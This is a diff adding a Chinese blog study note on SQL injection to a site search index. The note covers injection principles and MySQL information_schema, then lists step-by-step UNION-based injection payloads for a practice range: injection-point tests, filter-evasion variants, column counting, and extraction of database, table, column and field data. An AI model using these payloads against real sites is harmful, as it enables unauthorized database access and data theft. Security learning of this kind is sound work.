@@ -508,4 +508,57 @@
         <tag>Hacker101 CTF</tag>
       </tags>
   </entry>
+  <entry>
+    <title>SQL注入原理分析</title>
+    <url>/2021/07/13/SQL%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86/</url>
+    <content><![CDATA[<h2 id="SQL注入的本质"><a href="#SQL注入的本质" class="headerlink" title="SQL注入的本质"></a>SQL注入的本质</h2><blockquote>
+<p>注入攻击的<strong>本质: 把用户输入的数据当做代码执行</strong>。</p>
+<p>两个关键条件：</p>
+<p>第一个是用户能够控制输入</p>
+<p>第二个是原本程序要执行的代码，拼接了用户输入的数据然后进行执行</p>
+</blockquote>
+<p>针对<strong>SQL语句的注入</strong>，也可以理解为用户输入的数据当做<strong>SQL语句的代码执行</strong></p>
+<span id="more"></span>
+
+<h2 id="显错注入-联合查询（Mysql数据库）的基本流程"><a href="#显错注入-联合查询（Mysql数据库）的基本流程" class="headerlink" title="显错注入-联合查询（Mysql数据库）的基本流程"></a>显错注入-联合查询（Mysql数据库）的基本流程</h2><p><img src="https://image.3001.net/images/20210609/1623234067_60c0961324ec42331fc35.png!small?1623234067968" alt="1623234067_60c0961324ec42331fc35.png!small?1623234067968"></p>
+<blockquote>
+<p>重要知识点: <strong>通过系统自带库查询数据</strong></p>
+<p>通过系统自带库查询数据 Mysql在5.0以上版本加入了<strong>information_schema</strong> 这个系统自带库</p>
+<p>其中保存着关于MySQL服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权限等</p>
+<p><strong>information_schema.tables</strong>存放表名和库名的对应</p>
+<p><strong>information_schema.columns</strong>存放字段名和表名的对应</p>
+<p><strong>注： 【information_schema.tables 实际上是选中information_schema库中的tables表】</strong></p>
+</blockquote>
+<h2 id="显错注入靶场的做法"><a href="#显错注入靶场的做法" class="headerlink" title="显错注入靶场的做法"></a>显错注入靶场的做法</h2><p><strong>1.判断注入点</strong></p>
+<blockquote>
+<p>最古老的方法：    and 1=1 页面正常    and 1=2  页面不正常</p>
+<p>最简单的方法：    页面后面加’,看是否报错</p>
+<p>好用的方法：      如果是数字型传参，可以尝试-1</p>
+<p>例如：   <a href="http://www.xxx.com/new.php?id=1">http://www.xxx.com/new.php?id=1</a>  页面显示id=1的新闻</p>
+<p><a href="http://www.xxx.com/new.php?id=2-1">http://www.xxx.com/new.php?id=2-1</a>  页面显示id=1的新闻</p>
+<p>and 1=1 and 1=2 被拦截的可能性太高了</p>
+<p>可以尝试 and -1=-1 and -1=-2 and 1&gt;0  or 1=1</p>
+<p>或者直接 or sleep(5)</p>
+<p><strong>2. 判断当前页面字段总数</strong></p>
+<p>and 1=1 order by 1,2,3,4,5……</p>
+<p><strong>3.判断显示位</strong> </p>
+<p>and 1=2 union select 1,2,3,4,5,6,7……</p>
+<p><strong>4.查当前数据库</strong> </p>
+<p>and 1=2 union select 1,2,database()</p>
+<p><strong>5.查表名</strong> </p>
+<p>and 1=2 union select 1,2,table_name from information_schema.tables where table_schema=database() limit 0,1</p>
+<p><strong>6.查列名</strong> </p>
+<p>and 1=2 union select 1,2,column_name from information_schema.columns where table_name=表名 and table_schema=database() limit 0,1</p>
+<p><strong>7.查字段内容</strong> </p>
+<p>and 1=2 union select 1,字段名,字段名 from 表名 limit 0,1</p>
+<p><strong>注：</strong>函数<strong>GROUP_CONCAT</strong>将多行数据进行整合在一行输出</p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>学习笔记</category>
+      </categories>
+      <tags>
+        <tag>渗透测试学习</tag>
+      </tags>
+  </entry>
 </search>
